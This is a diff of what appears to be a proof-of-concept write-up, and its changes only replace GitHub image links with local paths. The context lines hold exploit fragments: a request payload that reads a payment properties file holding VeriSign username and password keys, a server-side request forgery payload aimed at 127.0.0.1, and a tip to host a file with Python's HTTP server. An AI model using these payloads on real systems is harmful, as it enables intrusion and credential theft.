@@ -18,7 +18,7 @@ Content-Length: 148
 
 requiredLabels={"file:applications/accounting/config/payment.properties":["payment.verisign.user","payment.verisign.pwd","payment.verisign.vendor"]}
 ```
-![image](https://github.com/wy876/POC/assets/139549762/093b6ca3-2917-4607-93a0-efaf2b3e2ca8)
+![image](../../images/093b6ca3-2917-4607-93a0-efaf2b3e2ca8.png)
 
 ## SSRF 
 ```
@@ -37,11 +37,11 @@ requiredLabels={"http://127.0.0.1/":["xxxxxx"]}
 ````
 
 这里随便写一个 properties 文件，然后 python -m http.server 8000 起个服务
-![image](https://github.com/wy876/POC/assets/139549762/683a3f21-0405-43f1-9d51-a44752107432)
+![image](../../images/683a3f21-0405-43f1-9d51-a44752107432.png)
 
-![image](https://github.com/wy876/POC/assets/139549762/7f5e826e-9564-4343-bf1e-d0d530ab7a3a)
+![image](../../images/7f5e826e-9564-4343-bf1e-d0d530ab7a3a.png)
 
-![image](https://github.com/wy876/POC/assets/139549762/beb30398-fa1b-4028-98f9-b3e8ccb4d90e)
+![image](../../images/beb30398-fa1b-4028-98f9-b3e8ccb4d90e.png)
 
 
 
